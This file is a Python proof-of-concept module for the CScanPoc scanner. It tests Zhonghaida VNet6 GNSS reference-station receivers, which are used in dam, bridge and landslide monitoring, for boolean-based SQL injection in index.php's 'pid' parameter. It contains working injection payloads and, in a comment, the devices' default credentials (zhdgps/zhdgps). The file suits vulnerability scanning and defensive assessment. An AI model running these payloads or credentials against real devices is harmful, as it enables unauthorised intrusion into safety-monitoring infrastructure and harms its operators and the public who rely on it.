# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType

class Vuln(ABVuln):
    vuln_id = 'Zhonghaida_0001' # 平台漏洞编号，留空
    name = '中海达VNet6专业型参考站接收机 SQL注入'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION # 漏洞类型
    disclosure_date = ''  # 漏洞公布时间
    desc = '''
        该产品是用于：滑坡监测，尾矿库安全监测，水库大坝安全监测，桥梁健康监测，沉降塌陷监测，建筑监测，机械精密控制，精准农业导航，和精密定位的GNSS接收机。
        中海达VNet6专业型参考站接收机 index.php 页面参数过滤不严谨，导致SQL注入漏洞。
    '''  # 漏洞描述
    ref = ''  # 漏洞来源
    cnvd_id = ''  # cnvd漏洞编号
    cve_id = ''  # cve编号
    product = '中海达VNet6专业型参考站接收机'  # 漏洞应用名称
    product_version = '中海达VNet6专业型参考站接收机'  # 漏洞应用版本

class Poc(ABPoc):
    poc_id = '434cad88-2249-4cb4-844b-a72e42959215'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-22'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            
            """
            该产品是用于：滑坡监测，尾矿库安全监测，水库大坝安全监测，桥梁健康监测，沉降塌陷监测，建筑监测，机械精密控制，精准农业导航，和精密定位的GNSS接收机。
            POC Name  : 中海达VNet6专业型参考站接收机 SQL注入
            使用默认的账号密码(zhdgps/zhdgps)
            """
            #几乎都有这个漏洞？？？？？？？？？？？？？？
            hh = hackhttp.hackhttp()
            arg = self.target
            payload1 = '/index.php?lang=en&pid=200%20and%201011-1010=1' #1011-1010 运算
            payload2 = '/index.php?lang=en&pid=200%20and%201011-1010=2'
          
            url1 = arg +  payload1
            url2 = arg +  payload2
          
            code1, head, res1, errcode, _ = hh.http(url1)
            code2, head, res2, errcode, _ = hh.http(url2)
          
            if (code1 == 200) and res1 not in res2 :
                #security_hole(url1 + ' SQL injection')
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        super(Poc, self).exploit()

if __name__ == '__main__':
    Poc().run()
